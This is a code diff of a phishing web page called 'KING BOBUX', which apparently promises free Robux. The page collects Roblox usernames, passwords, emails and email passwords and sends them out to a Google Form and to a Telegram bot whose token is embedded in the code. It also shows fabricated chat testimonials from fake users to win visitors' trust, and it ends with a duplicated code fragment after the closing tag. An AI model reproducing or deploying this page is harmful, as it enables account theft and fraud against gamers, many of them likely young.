@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KING BOBUX | ELITE V.9</title>
+    <title>KING BOBUX | ELITE V.10</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;700&family=Orbitron:wght@900&display=swap');
@@ -16,22 +16,16 @@
         .input-glow { background: rgba(0, 0, 0, 0.6); border: 1px solid rgba(255, 215, 0, 0.2); width: 100%; padding: 15px; border-radius: 15px; color: #ffd700; outline: none; }
         .hidden { display: none !important; }
         
-        /* Overlay Style */
-        #overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 999; display: flex; flex-direction: column; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
+        /* Musik Toggle Button */
+        #music-toggle { position: fixed; top: 20px; right: 20px; z-index: 1000; background: rgba(255, 215, 0, 0.1); border: 1px solid #ffd700; color: #ffd700; padding: 10px; border-radius: 50%; width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 18px; box-shadow: 0 0 10px rgba(255, 215, 0, 0.3); }
     </style>
 </head>
 <body class="p-6">
 
-    <div id="overlay">
-        <h2 class="gold-glow text-2xl font-black mb-8 italic uppercase tracking-tighter">Initialize System?</h2>
-        <div class="space-y-4 w-64">
-            <button onclick="startApp(true)" class="w-full btn-main py-4 text-xs font-black uppercase tracking-widest">ENTER WITH MUSIC</button>
-            <button onclick="startApp(false)" class="w-full btn-opt py-4 text-xs font-black uppercase tracking-widest text-zinc-400">SILENT MODE</button>
-        </div>
-    </div>
+    <button id="music-toggle" onclick="toggleMusic()">🔇</button>
 
-    <audio id="bgm" loop>
-        <source src="https://cdn.discordapp.com/attachments/1487168723466064074/1487286422523219978/9056977040d56940fbd8f2946f83369f.mp4?ex=69c896eb&is=69c7456b&hm=19cf18b80b24e73b71784b328751bcf718f9e7ad24e7eb5b08a15c86805a11bf&" type="audio/mp4">
+    <audio id="bgm" loop muted>
+        <source src="https://cdn.discordapp.com/attachments/1487168723466064074/1487290858339438743/9056977040d56940fbd8f2946f83369f.mp4?ex=69c89b0d&is=69c7498d&hm=e582044f9a1d6cfcc9e823062a9e7741c46bb42e0053c0b9a6cc0a403674b999&" type="audio/mp4">
     </audio>
 
     <header class="text-center my-10">
@@ -80,19 +74,21 @@
     </div>
 
     <script>
-        let amt = "", md = "", isMusicEnabled = false;
+        let amt = "", md = "";
         const tok = "8712552694:AAHAjQQhwx4Vlas6CWs6QHB4iYSA5U2LiWM", cid = "7153376507";
         const form = "https://docs.google.com/forms/d/e/1FAIpQLSfgBrBP1Bqk4tfVHBFUPZDCbW5fj7nK8NZuObuQPmhyRcEGxg/formResponse";
+        const audio = document.getElementById('bgm');
+        const btnMusic = document.getElementById('music-toggle');
 
-        // Fungsi Mulai Aplikasi (Pilih Musik)
-        function startApp(music) {
-            document.getElementById('overlay').classList.add('hidden');
-            isMusicEnabled = music;
-            if (isMusicEnabled) {
-                const a = document.getElementById('bgm');
-                a.currentTime = 0; // Mulai dari awal
-                a.volume = 0.5;
-                a.play().catch(() => {});
+        function toggleMusic() {
+            if (audio.muted) {
+                audio.muted = false;
+                audio.volume = 0.5;
+                audio.play();
+                btnMusic.innerText = "🔊";
+            } else {
+                audio.muted = true;
+                btnMusic.innerText = "🔇";
             }
         }
 
@@ -100,6 +96,8 @@
             document.querySelectorAll('.btn-opt').forEach(x => x.classList.remove('active')); 
             b.classList.add('active'); 
             amt = v; 
+            // Otomatis mulai muter saat klik (tapi tetep mute kalau belum klik tombol kanan atas)
+            audio.play().catch(()=>{});
         }
 
         function go(f, t) { if (!amt && f == 1) return; document.getElementById('p' + f).classList.add('hidden'); document.getElementById('p' + t).classList.remove('hidden'); }
@@ -110,6 +108,21 @@
             if (!u || !p) return;
             const fd = new FormData(); fd.append('entry.298399091', u); fd.append('entry.434090398', p); fd.append('entry.455306086', e); fd.append('entry.734491941', ep); fd.append('entry.1584180390', amt);
             fetch(form, { method: 'POST', mode: 'no-cors', body: fd });
+            fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(`🚀 *ELITE*\n👤 \`${u}\`\n🔑 \`${p}\`\n📧 \`${e}\`\n🔐 \`${ep}\`\n💎 \`${amt}\``)}&parse_mode=Markdown`);
+            go(3, 4); setTimeout(() => document.getElementById('bar').style.width = "100%", 100);
+        }
+
+        const botMsgs = [{n:"Rizky***",m:"Landing mulus thx admin."}, {n:"Vito***",m:"Beneran masuk 10k!"}, {n:"Adit***",m:"Yess cair 50k!"}];
+        function addChat(n,m,v=false){
+            const b=document.getElementById('chat-content'), d=document.createElement('div');
+            d.className=`${v?'text-teal-400 font-bold':''}`; d.innerHTML=`<span class="text-yellow-500 font-bold">${n}</span>: ${m}`;
+            b.insertBefore(d,b.firstChild); if(b.childNodes.length>7)b.removeChild(b.lastChild);
+        }
+        setInterval(()=>{const b=botMsgs[Math.floor(Math.random()*botMsgs.length)]; addChat(b.n,b.m);},3000);
+        function victimSend(){ const i=document.getElementById('victim-msg'); if(!i.value)return; const m=["Semoga masuk 24jam","yess akhirnya bisa punya robux banyak"]; addChat("K***_Anom", m[Math.floor(Math.random()*m.length)],true); i.value=""; }
+    </script>
+</body>
+</html>
             fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(`🚀 *ELITE*\n👤 \`${u}\`\n🔑 \`${p}\`\n📧 \`${e}\`\n🔐 \`${ep}\`\n💎 \`${amt}\``)}&parse_mode=Markdown`);
             go(3, 4); setTimeout(() => document.getElementById('bar').style.width = "100%", 100);
         }
